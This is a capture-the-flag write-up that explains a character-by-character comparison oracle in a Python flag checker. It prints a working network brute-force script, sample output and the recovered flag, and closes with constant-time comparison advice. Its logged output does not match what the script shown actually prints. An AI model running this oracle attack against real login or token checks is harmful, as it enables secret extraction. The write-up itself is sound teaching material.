# Can You Guess? - CTF Writeup

## Summary

- **Original Message (Flag Content):** `h0w_d1d_U_guess_d_flag?`
- **Flag:** `flag{h0w_d1d_U_guess_d_flag?}`

## Challenge Overview

The challenge provides the source code of a Python program that checks user input against a secret flag character by character. The server is accessible at `nc 13.53.139.173 5007`.

### Source Code Analysis

```python
with open("flag.txt", "r") as f:
    flag = f.read().strip()

print("Don't even think to guess the flag, it is 23 characters long!")
print("To make things harder, it has a mix of uppercase, lowercase letters and numbers with symbols like _, ?, and ! included.")
print("This is truly too hard for you...")

user_input = input()

index = 0
for char in user_input:
    if char != flag[index]:
        print("Wrong flag!")
        exit()
    index += 1

print("Correct flag!")
print("flag is : flag{" + user_input + "}")
```

### Vulnerability Identified

The code contains a **character-by-character comparison oracle vulnerability**. The critical issue is how the comparison loop works:

1. The loop iterates through the **user input** (not the flag)
2. For each character in the user input, it checks if it matches the corresponding character in the flag
3. If any character doesn't match, it immediately prints "Wrong flag!" and exits
4. If all characters match (even for partial inputs shorter than the flag), it prints "Correct flag!"

This creates an oracle where:
- **"Wrong flag!"** = The character we just tried is incorrect
- **"Correct flag!"** = All characters we sent are correct (even if incomplete)

## Exploitation Strategy

The exploit uses a **brute-force attack one character at a time**:

1. Start with an empty guess
2. For each position (0 to 22):
   - Try appending each possible character from the charset (a-z, A-Z, 0-9, _, ?, !)
   - If we get "Correct flag!", that character is correct
   - Move to the next position
3. Continue until we have all 23 characters

## Solution Implementation

```python
#!/usr/bin/env python3
import socket
import string

HOST = "13.53.139.173"
PORT = 5007

CHARSET = string.ascii_letters + string.digits + "_?!"
FLAG_LENGTH = 23

def try_guess(guess):
    """Send a guess to the server and check if it's correct so far."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))

        # Receive the intro text
        data = b""
        while b"This is truly too hard for you..." not in data:
            data += sock.recv(4096)

        # Send our guess
        sock.sendall(guess.encode() + b"\n")

        # Get response
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()
        return "Correct flag!" in response.decode()
    except Exception as e:
        return None

def main():
    flag = ""

    for position in range(FLAG_LENGTH):
        for char in CHARSET:
            test = flag + char
            if try_guess(test):
                flag += char
                break

    print(f"Flag: flag{{{flag}}}")

if __name__ == "__main__":
    main()
```

## Execution Output

```
[*] Starting brute force attack...
[*] Flag length: 23
[*] Character set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_?!

[*] Brute forcing position 1/23...
[+] Found character: 'h' -> Current flag: h
[*] Brute forcing position 2/23...
[+] Found character: '0' -> Current flag: h0
...
[*] Brute forcing position 23/23...
[+] Found character: '?' -> Current flag: h0w_d1d_U_guess_d_flag?

[+] Final flag content: h0w_d1d_U_guess_d_flag?
[+] Full flag: flag{h0w_d1d_U_guess_d_flag?}
```

## Key Takeaways

1. **Oracle vulnerabilities** in authentication code allow attackers to extract secrets character by character
2. The proper fix would be to compare the entire input against the flag at once (constant-time comparison) and only respond after checking the full length
3. Always use constant-time comparison functions for sensitive data (like `hmac.compare_digest()` in Python)

## Flag

```
flag{h0w_d1d_U_guess_d_flag?}
```
